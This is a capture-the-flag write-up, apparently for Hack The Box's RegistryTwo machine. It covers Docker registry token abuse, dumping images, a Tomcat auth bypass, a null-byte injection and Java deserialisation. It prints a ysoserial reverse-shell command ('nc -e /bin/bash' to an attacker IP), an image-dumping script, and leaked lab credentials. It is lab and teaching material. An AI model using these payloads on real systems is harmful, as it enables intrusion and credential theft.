# RegistryTwo

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.172.95                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 12:25 +08
Nmap scan report for 10.129.172.95
Host is up (0.0064s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
5000/tcp open  upnp
5001/tcp open  commplex-link
```

Port 5000 is for Docker Registry based on Hacktricks. I did a detailed scan as well:

```
$ nmap -p 443,5000,5001 -sC -sV --min-rate 5000 10.129.172.95         
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 12:27 +08
Nmap scan report for 10.129.172.95
Host is up (0.0067s latency).

PORT     STATE SERVICE            VERSION
443/tcp  open  ssl/http           nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
| ssl-cert: Subject: organizationName=free-hosting/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2023-02-01T20:19:22
|_Not valid after:  2024-02-01T20:19:22
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://www.webhosting.htb/
5000/tcp open  ssl/http           Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=*.webhosting.htb/organizationName=Acme, Inc./stateOrProvinceName=GD/countryName=CN
| Subject Alternative Name: DNS:webhosting.htb, DNS:webhosting.htb
| Not valid before: 2023-03-26T21:32:06
|_Not valid after:  2024-03-25T21:32:06
5001/tcp open  ssl/commplex-link?
```

We can take note of the `webhosting.htb` domain and add it to the `/etc/hosts` file.&#x20;

### Initial Enumeration --> Fuzz Params

We have to add `www.webhosting.htb` to our `/etc/hosts` file to view the HTTPS application:

<figure><img src="../../.gitbook/assets/image (4091).png" alt=""><figcaption></figcaption></figure>

We can try registering a user and logging in.&#x20;

<figure><img src="../../.gitbook/assets/image (4092).png" alt=""><figcaption></figcaption></figure>

Using this, we have the ability to create new subdomains:

<figure><img src="../../.gitbook/assets/image (4093).png" alt=""><figcaption></figcaption></figure>

Visiting this reveals a simple HTML page:

<figure><img src="../../.gitbook/assets/image (4094).png" alt=""><figcaption></figcaption></figure>

Since this machine is Docker related, the web application might be creating a Docker container for each new subdomain that we create. As such, we can focus a bit more on port 5000.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry" %}

{% embed url="https://github.com/Syzik/DockerRegistryGrabber" %}

When using `DockerGraber.py`, I got an unauthorized error:

```
$ python3 DockerGraber.py https://www.webhosting.htb -p 5000 --list
[+]======================================================[+]
[|]    Docker Registry Grabber v1       @SyzikSecu       [|]
[+]======================================================[+]

Http Error: 401 Client Error: Unauthorized for url: 
https://www.webhosting.htb:5000/v2/_catalog
```

Turns out that we need some credentials to access the API:

<figure><img src="../../.gitbook/assets/image (4095).png" alt=""><figcaption></figcaption></figure>

Interesting, because port 5001 shows an Auth Server we can fuzz next:

<figure><img src="../../.gitbook/assets/image (4096).png" alt=""><figcaption></figcaption></figure>

A quick directory scan reveals that `/auth` is a valid directory, and visiting it just returns access tokens:

```
$ curl --silent -k https://www.webhosting.htb:5001/auth | jq
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNjkwNTIwMjg3LCJuYmYiOjE2OTA1MTkzNzcsImlhdCI6MTY5MDUxOTM4NywianRpIjoiNzA1MzcwMTE0MjcxNjYxNjk2NyIsImFjY2VzcyI6W119.IJ_sOzSUNwbejcP3BPw1Lu_kLCFUo8az5vdj97K5FLjwwIMXZVklWdiBazjaLcDzjwS4b1LE-xi1wYK5rG6KaEmbZSXpxOsbpHtJz9cjl3woO_84FeegH2HJo4_XxpwqN2rfKDzrw2CL7B13vQf2rh77QVCvNYr8Ju27m6elki8LvwdpzEVHm5Jxfx-gG20RU96zg7VGvS4H8v6-3Z6obAXPX_qZid-n8mpi1drhdaD94WHSmRe7Wt6L4IXFAt3Bt6_mU45dVXowryENu_ztuTOxdFHALuogFdwhSaZo5l0y76_rK7UuqRj7eQL1d7pu4SSOwZrZb-uqQ50Dad_FZQ",                                                                        
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiIiwiZXhwIjoxNjkwNTIwMjg3LCJuYmYiOjE2OTA1MTkzNzcsImlhdCI6MTY5MDUxOTM4NywianRpIjoiNzA1MzcwMTE0MjcxNjYxNjk2NyIsImFjY2VzcyI6W119.IJ_sOzSUNwbejcP3BPw1Lu_kLCFUo8az5vdj97K5FLjwwIMXZVklWdiBazjaLcDzjwS4b1LE-xi1wYK5rG6KaEmbZSXpxOsbpHtJz9cjl3woO_84FeegH2HJo4_XxpwqN2rfKDzrw2CL7B13vQf2rh77QVCvNYr8Ju27m6elki8LvwdpzEVHm5Jxfx-gG20RU96zg7VGvS4H8v6-3Z6obAXPX_qZid-n8mpi1drhdaD94WHSmRe7Wt6L4IXFAt3Bt6_mU45dVXowryENu_ztuTOxdFHALuogFdwhSaZo5l0y76_rK7UuqRj7eQL1d7pu4SSOwZrZb-uqQ50Dad_FZQ"                                                                                
}
```

The tokens were pretty plain, nothing interesting in it. Within the token there was an `access` field that was empty:

<figure><img src="../../.gitbook/assets/image (4097).png" alt=""><figcaption></figcaption></figure>

When looking at the Hacktricks page, the Authorization error seems to be something like this:

{% code overflow="wrap" %}
```json
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```
{% endcode %}

However, in my case the `detail` variable has been set to `null`, even when I send this token in as part of either the `Cookie` or `Authorization: Bearer` headers. Perhaps we need to specify the service that we want or something.&#x20;

Based on this, I started to fuzz the parameters that we could send with this link with `wfuzz`:

```
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh=1332,1330 https://www.webhosting.htb:5001/auth?FUZZ=aaaaaaaa
<TRUNCATED>                  
000000375:   200        0 L      1 W        1354 Ch     "service"                   
000000349:   401        1 L      2 W        13 Ch       "account"                   
000000450:   200        0 L      1 W        1328 Ch     "tag"                       
000000558:   200        0 L      1 W        1328 Ch     "85"                        
000000652:   200        0 L      1 W        1328 Ch     "transparent"               
000000712:   200        0 L      1 W        1324 Ch     "forward"                   
000000734:   200        0 L      1 W        1324 Ch     "columnists"                
<TRUNCATED>
```

Out of all the outputs, `account` and `service` had the greatest deviation from the rest of them, indicating that a completely different token was generated. `account` just requested us to login via HTTP, while the `service` one was interesting. Seems that it changes the `aud` parameter.&#x20;

<figure><img src="../../.gitbook/assets/image (4098).png" alt=""><figcaption></figcaption></figure>

Based on this, we can fuzz further for other parameters as I want to change the `access` portion and see if we can access other resources.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh=1352,1354,1346,1348 'https://www.webhosting.htb:5001/auth?service=aaaaaaaa&FUZZ=bbbbbbbb'
000000481:   401        1 L      2 W        13 Ch       "account"                   
000003637:   400        1 L      5 W        39 Ch       "scope"
```

Seems that `scope` is the next parameter.&#x20;

<figure><img src="../../.gitbook/assets/image (4101).png" alt=""><figcaption></figcaption></figure>

There's a valid scope to enter. The normal error message included 3 parameters:

```json
[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```

Based on this error, it might be looking for these 3 parameters. After some testing, I found that `scope=registry:catalog:*` returned a valid token:

<figure><img src="../../.gitbook/assets/image (4102).png" alt=""><figcaption></figcaption></figure>

Now we need to experiment with what's the right `aud` parameter to stop getting an error. I found that specifying `Docker+registry` worked and I didn't get an error on port 5000:

<figure><img src="../../.gitbook/assets/image (4103).png" alt=""><figcaption></figcaption></figure>

### API Fuzz --> Dump Repository

Visiting `v2/_catalog` returned one repository:

<figure><img src="../../.gitbook/assets/image (4104).png" alt=""><figcaption></figcaption></figure>

Attempting to dump the repository using the same token results in an error:

<figure><img src="../../.gitbook/assets/image (4105).png" alt=""><figcaption></figcaption></figure>

We can change the token to have `scope=repository:hosting-app:pull` and try again:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNTIxNTQ3LCJuYmYiOjE2OTA1MjA2MzcsImlhdCI6MTY5MDUyMDY0NywianRpIjoiNjk1NjI0NzQwMTI4MjUzNzkyMSIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.W4Hz4J10gZ7_gX4GvLE9t1SJf3tiYcr7ZXncXr3TSzW8At_XV74PMWiPQDBIQwgl_2e4pGXf_FMkztgSbYGMEwuFKDzbkg11rx3iytL3wt0P_KxAjMb-s2j_CHU1ngZHIDAOrJ1fLpsks6ybuBCRpE2WxiKagpuz0lVcKPln0aRhHkcj8ZjPyODTJW2oUbkLiL7zjo9k8c6xrNbufoO8kTALvdJHQJ68MrWLLvg7qSw1NRdOXPrTsw1Jzku7h2E5Kmwatj9j7INkCfIK2kDwfVN0Nrt2mKu5HrZAei9V8vX23pDxNAh-71fddY6DmzGCx2bLQGQJhDgwpeIuSkix8A
```

<figure><img src="../../.gitbook/assets/image (4106).png" alt=""><figcaption></figcaption></figure>

Visiting `/manifests/latest` reveals a lot of information like `blobSum` and what not. Based on this, we can modify `DockerGraber.py` to include this token and dump everything from it using that. Here's my modified script:

```python
#!/usr/bin/env python3

import requests
import argparse
import re
import json
import sys
import os
from base64 import b64encode
import urllib3
from rich.console import Console
from rich.theme import Theme
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
req = requests.Session()

http_proxy = ""
os.environ['HTTP_PROXY'] = http_proxy
os.environ['HTTPS_PROXY'] = http_proxy

custom_theme = Theme({
    "OK": "bright_green",
    "NOK": "red3"
})

def manageArgs():
    parser = argparse.ArgumentParser()
        # Positionnal args
    parser.add_argument("url", help="URL")
        # Optionnal args
    parser.add_argument("-p", dest='port', metavar='port', type=int, default=5000, help="port to use (default : 5000)")
        ## Authentification
    auth = parser.add_argument_group("Authentication")
    auth.add_argument('-U', dest='username', type=str, default="", help='Username')
    auth.add_argument('-P', dest='password', type=str, default="", help='Password')
        ### Args Action en opposition
    action = parser.add_mutually_exclusive_group()
    action.add_argument("--dump", metavar="DOCKERNAME", dest='dump', type=str,  help="DockerName")
    action.add_argument("--list", dest='list', action="store_true")
    action.add_argument("--dump_all",dest='dump_all',action="store_true")
    args = parser.parse_args()
    return args

def printList(dockerlist):
    for element in dockerlist:
        if element:
            console.print(f"[+] {element}", style="OK")
        else:
            console.print(f"[-] No Docker found", style="NOK")

def tryReq(url, headers, username=None,password=None):
    try:
        if username and password:
            r = req.get(url,verify=False, auth=(username,password), headers=headers)
            r.raise_for_status()
        else:
            r = req.get(url,verify=False, headers=headers)
            r.raise_for_status()
    except requests.exceptions.HTTPError as errh:
        console.print(f"Http Error: {errh}", style="NOK")
        sys.exit(1)
    except requests.exceptions.ConnectionError as errc:
        console.print(f"Error Connecting : {errc}", style="NOK")
        sys.exit(1)
    except requests.exceptions.Timeout as errt:
        console.print(f"Timeout Error : {errt}", style="NOK")
        sys.exit(1)
    except requests.exceptions.RequestException as err:
        console.print(f"Dunno what happend but something fucked up {err}", style="NOK")
        sys.exit(1)
    return r

def createDir(directoryName):
    if not os.path.exists(directoryName):
        os.makedirs(directoryName)

def downloadSha(url, port, docker, sha256, username=None, password=None):
    header = {'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNTIzOTUwLCJuYmYiOjE2OTA1MjMwNDAsImlhdCI6MTY5MDUyMzA1MCwianRpIjoiNDAzMjY1NzAzMjA0NjI0NzgwMiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.Czl2xzwaM-R8mY--HzpctBqX19UP7aU53jLVmt4RPeREwaSAF40xumUK_pktW6jnOdgI4U3x3sWYfhrazXZXLuz9_nOA7So4JhWQII55lgUlHX0bPgybA2zI1q4E3aVolPzJESK_CWIPqqIWZcTGd7sYGQxKG0t7EXreVIpD6tE-r1cqwDGYrAXCfKxNV-VOSffmVQqM73L477FNs5PUMDT8CD6wZgy8L0z2PIiaTGu-S4Gy0F5-USmoQpIGfZo7Stxhqj7obmVE0qedHXLyoRWIAE7DceaZY5iXNQSS0cFsT2NE9P_HWm2SGbUW0BP_BxoS0mKrrVEhU9stZvgw1Q'}
    createDir(docker)
    directory = f"./{docker}/"
    for sha in sha256:
        filenamesha = f"{sha}.tar.gz"
        geturl = f"{url}:{str(port)}/v2/{docker}/blobs/sha256:{sha}"
        r = tryReq(geturl,header,username,password) 
        if r.status_code == 200:
            console.print(f"    [+] Downloading : {sha}", style="OK")
            with open(directory+filenamesha, 'wb') as out:
                for bits in r.iter_content():
                    out.write(bits)

def getBlob(docker, url, port, username=None, password=None):
    tags = f"{url}:{str(port)}/v2/{docker}/tags/list"
    header = {'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNTIzOTUwLCJuYmYiOjE2OTA1MjMwNDAsImlhdCI6MTY5MDUyMzA1MCwianRpIjoiNDAzMjY1NzAzMjA0NjI0NzgwMiIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.Czl2xzwaM-R8mY--HzpctBqX19UP7aU53jLVmt4RPeREwaSAF40xumUK_pktW6jnOdgI4U3x3sWYfhrazXZXLuz9_nOA7So4JhWQII55lgUlHX0bPgybA2zI1q4E3aVolPzJESK_CWIPqqIWZcTGd7sYGQxKG0t7EXreVIpD6tE-r1cqwDGYrAXCfKxNV-VOSffmVQqM73L477FNs5PUMDT8CD6wZgy8L0z2PIiaTGu-S4Gy0F5-USmoQpIGfZo7Stxhqj7obmVE0qedHXLyoRWIAE7DceaZY5iXNQSS0cFsT2NE9P_HWm2SGbUW0BP_BxoS0mKrrVEhU9stZvgw1Q'}
    rr = tryReq(tags,header, username,password)
    data = rr.json()
    image = data["tags"][0]
    url = f"{url}:{str(port)}/v2/{docker}/manifests/"+image+""
    r = tryReq(url,header,username,password) 
    blobSum = []
    if r.status_code == 200:
        regex = re.compile('blobSum')
        for aa in r.text.splitlines():
            match = regex.search(aa)
            if match:
                blobSum.append(aa)
        if not blobSum :
            console.print(f"[-] No blobSum found", style="NOK")
            sys.exit(1)
        else :
            sha256 = []
            cpt = 1
            for sha in blobSum:
                console.print(f"[+] BlobSum found {cpt}", end='\r', style="OK")
                cpt += 1
                a = re.split(':|,',sha)
                sha256.append(a[2].strip("\""))
            print()
            return sha256

def enumList(url, port, username=None, password=None,checklist=None):
    cookie = {'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNTI0MTg4LCJuYmYiOjE2OTA1MjMyNzgsImlhdCI6MTY5MDUyMzI4OCwianRpIjoiNjA3NzM5NTYyMzkwNTI5NjY3MSIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dfQ.IMKOSfl4SURM9alvmF7Yadf7b3hmMBI79H5hQWrrev4zHwLc4CDIo43Ndo4QduNEI0TUJ7S3kTgUDFWek7B_zbohJouVOY3HvbASWvZHKS-cp4MT3565jkNwZug51N-r5cjpJfMBy90rTeeCmswsjZMzQ3pJHL5Db_ceIn0mJc0ZCG1zMcET76MhLn61WREznh7vDpPnA6M1sHGwFQiddKMIWTIoi7fI_EdRCUskJmXP6WsTvsKs-DsFE-odMlYGd4452RQWW-wTuiqlnXuLHDcVh19sOuwUCd7tTIC7F1OkwCHJw2_vBf_sICBEmPPQYVkyz5Wqfj3cuM1KDYRnoA'}
    url = f"{url}:{str(port)}/v2/_catalog"
    try :
        r = tryReq(url,cookie,username,password) 
        if r.status_code == 200:
            catalog2 = re.split(':|,|\n ',r.text)
            catalog3 = []
            for docker in catalog2:
                dockername = docker.strip("[\'\"\n]}{")
                catalog3.append(dockername)
        printList(catalog3[1:])
        return catalog3
    except:
        exit()

def dump(args):
    sha256 = getBlob(args.dump, args.url, args.port, args.username, args.password)
    console.print(f"[+] Dumping {args.dump}", style="OK")
    downloadSha(args.url, args.port, args.dump, sha256, args.username, args.password)

def dumpAll(args):
    dockerlist = enumList(args.url, args.port, args.username,args.password)
    for docker in dockerlist[1:]:
        sha256 = getBlob(docker, args.url, args.port, args.username,args.password)
        console.print(f"[+] Dumping {docker}", style="OK")
        downloadSha(args.url, args.port,docker,sha256,args.username,args.password)

def options():
    args = manageArgs()
    if args.list:
        enumList(args.url, args.port,args.username,args.password)
        
    elif args.dump_all:
        dumpAll(args)
    elif args.dump:
        dump(args)

if __name__ == '__main__':
    print(f"[+]======================================================[+]")
    print(f"[|]    Docker Registry Grabber v1       @SyzikSecu       [|]")
    print(f"[+]======================================================[+]")
    print()
    urllib3.disable_warnings()
    console = Console(theme=custom_theme)
    options()
```

<figure><img src="../../.gitbook/assets/image (4107).png" alt=""><figcaption></figcaption></figure>

This would generate loads of `tar` files from the repository we pulled:

```
$ ls
0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba.tar.gz
0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110.tar.gz
396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7.tar.gz
497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9.tar.gz
4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42.tar.gz
5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4.tar.gz
7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b.tar.gz
9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c.tar.gz
9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268.tar.gz
a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.tar.gz
ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec.tar.gz
b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc.tar.gz
e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84.tar.gz
f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e.tar.gz
fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626.tar.gz
ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28.tar.gz
```

### Source Code Review --> Tomcat Bypass

The first file contained some SQL credentials, and mention of RMI:

```
$ cat hosting.ini                                                    
#Mon Jan 30 21:05:01 GMT 2023
mysql.password=O8lBvQUBPU4CMbvJmYqY
rmi.host=registry.webhosting.htb
mysql.user=root
mysql.port=3306
mysql.host=localhost
domains.start-template=<body>\r\n<h1>It works\!</h1>\r\n</body>
domains.max=5
rmi.port=9002
```

We can extract the rest of the files with:

```
$ for f in *.tar.gz; do tar xf "$f" ; done
$ ls
bin  dev  etc  home  lib  media  mnt  proc  root  run  sbin  srv  sys  tmp  usr  var
```

Within the `/usr/local/tomcat/webapps/` folder, there's some source code for the web application:

```
$ ls
docs  examples  hosting.war  host-manager  manager  ROOT
```

The source code seems to be compiled within the `.war` file. We can decompile this online or `jd-gui`.&#x20;

<figure><img src="../../.gitbook/assets/image (4108).png" alt=""><figcaption></figcaption></figure>

There's a lot to look through here. Within the `ConfigurationServlet.class` file, there's a check on whether we are a manager on the website:

<figure><img src="../../.gitbook/assets/image (4109).png" alt=""><figcaption></figcaption></figure>

Within `RMIClientWrapper.class`, there's mention of other hostnames as well:

<figure><img src="../../.gitbook/assets/image (4110).png" alt=""><figcaption></figcaption></figure>

And this has to do with the `FileService` somehow.&#x20;

We need a way to modify our session to become an Administrator. Since this is Tomcat, I found this page detailing how it is possible to become an administrator:

{% embed url="https://www.acunetix.com/vulnerabilities/web/apache-tomcat-examples-directory-vulnerabilities/" %}

Took me about 1 hour before realising that the `..;` Tomcat auth bypass works here:

<figure><img src="../../.gitbook/assets/image (4111).png" alt=""><figcaption></figcaption></figure>

Using this, we can locate the `SessionExample` page:

<figure><img src="../../.gitbook/assets/image (4112).png" alt=""><figcaption></figcaption></figure>

Using this, we can set the `s_IsLoggedInUserRoleManager` session attribute to `true`. Afterwards, we would gain access to the reconfiguration panel.

<figure><img src="../../.gitbook/assets/image (4113).png" alt=""><figcaption></figcaption></figure>

### More Reviewing --> RMIClient LFI

The key question in my head was around the `rmiHost` parameter and where we had to use it. Since we had access to the Reconfigure panel as the manager of the site, this only gave us one more thing to work with, which was this panel:

<figure><img src="../../.gitbook/assets/image (4114).png" alt=""><figcaption></figcaption></figure>

By default, the HTTP request for this only includes the `domains.max` and `domains.start-template` parameters. Within the `ConfigurationServlet.class` file however, it shows that sending POST requesst to this updates the `Settings` variable using a hashmap.&#x20;

The code for the RMI portion takes the `rmi.host` parameter from the `Settings` variable and checks for whether it contains the `.htb` string. We can try to specify our IP address and bypass the check using a null byte.

Here's the request:

{% code overflow="wrap" %}
```http
POST /hosting/reconfigure HTTP/1.1
Host: www.webhosting.htb
Cookie: JSESSIONID=4D32F3013C3793D48EC21C821B4E640E
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Origin: https://www.webhosting.htb
Referer: https://www.webhosting.htb/hosting/reconfigure
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close



domains.max=5&domains.start-template=%3Cbody%3E%0D%0A%3Ch1%3EIt+works%21%3C%2Fh1%3E%0D%0A%3C%2Fbody%3E&rmi.host=10.10.14.24%00.htb
```
{% endcode %}

The code makes a connection to port 9002 using the RMI service. As such, we can create an RMI server and listen on that port. Googling for exploits shows a CTF Writeup where deserialisation was used to achieve RCE on the remote server.

{% embed url="https://ctftime.org/writeup/12656" %}

I didn't have anything else I could do, so I tried it using the different CommonsCollections there were within `ysoserial`.&#x20;

```
$ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp ~/ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 'nc -e /bin/bash 10.10.14.24 4444' 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
* Opening JRMP listener on 9002
```

After sending the boave request, we need a method of which to trigger the exploit. From looking at service and our limited stuff, I honestly randomly clicked around the website, and found that by visiting the existing domain created, it triggers the exploit:

```
$ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -cp ~/ysoserial-all.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 'nc 10.10.14.24 4444 -e /bin/bash'
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
* Opening JRMP listener on 9002
Have connection from /10.129.83.85:53446
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

<figure><img src="../../.gitbook/assets/image (4115).png" alt=""><figcaption></figcaption></figure>

### App --> RMI Client --> Read User Creds

This shell was within a very restricted docker container. Checking the services present, we can see that there are loads of other ports:

```
bash-4.4$ netstat -tulpn
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5001            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3310            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::443                  :::*                    LISTEN      -
tcp        0      0 :::39621                :::*                    LISTEN      -
tcp        0      0 ::ffff:127.0.0.1:8005   :::*                    LISTEN      1/java
tcp        0      0 :::5000                 :::*                    LISTEN      -
tcp        0      0 :::8009                 :::*                    LISTEN      1/java
tcp        0      0 :::5001                 :::*                    LISTEN      -
tcp        0      0 :::9002                 :::*                    LISTEN      -
tcp        0      0 :::3306                 :::*                    LISTEN      -
tcp        0      0 :::3310                 :::*                    LISTEN      -
tcp        0      0 :::8080                 :::*                    LISTEN      1/java
tcp        0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

These other ports might be run by a user on the main machine. The most interesting thing was port 9002 which was listening within the container.&#x20;

The idea of `FileService` was still present in my head. Perhaps there was a way to interact with the actual service that was listening on port 9002 reachable from this container, since we injected code into the `rmi.host` parameter to get this shell in the first place. I took another look at the source code for the `FileService.class` file:

<figure><img src="../../.gitbook/assets/image (4116).png" alt=""><figcaption></figcaption></figure>

Problem is, there's no actual code present that would interact with the service. Based on the functions available, we should be able to use the `getFile` method to read stuff from the directory using a custom client that we can create using all the code present.&#x20;

> Code is at the end of the writeup. &#x20;

I took these files:

* `AbstractFile.class`
* `FileService.class`
* `RMIClientWrapper.class` and modified it such that I can specify the file that I want to read.

Afterwards, I compiled the code within `com/htb/hosting/rmi` to be consistent with the `package` variable I used.&#x20;

```
$ javac com/htb/hosting/rmi/RMIClientWrapper.java 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Then, we need to forward port 9002 using `chisel`. I did my initial testing, and realised that we need to include the `CryptUtil.class` files since the service seems to expect an encrypted path.

Afterwards, we can compile and run the RMIClient code and find that it works in listing directories and reading files! Reading `/etc/passwd` just shows us that `developer` is a user on the machine, and the user's directory contains some useful information.&#x20;

```
$ proxychains java com/htb/hosting/rmi/RMIClientWrapper "/../../home/developer/" "/../../home/developer/.git-credentials" 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Jul 29, 2023 8:06:27 PM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:9002  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:41669  ...  OK
/home
/home/developer/.cache
/home/developer/.bash_logout
/home/developer/.bashrc
/home/developer/.bash_history
/home/developer/.git-credentials
/home/developer/user.txt
/home/developer/.gnupg
/home/developer/.profile
/home/developer/.vimrc

Reading content:
Jul 29, 2023 8:06:27 PM com.htb.hosting.rmi.RMIClientWrapper get
INFO: Connecting to registry.webhosting.htb:9002
https://irogir:qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9@github.com
```

With that password, we can `ssh` in as the `developer` user:

<figure><img src="../../.gitbook/assets/image (4117).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Pspy --> JAR File Analysis

I ran `pspy64` on the machine, and found that the `root` user was running a `.jar` file:

```
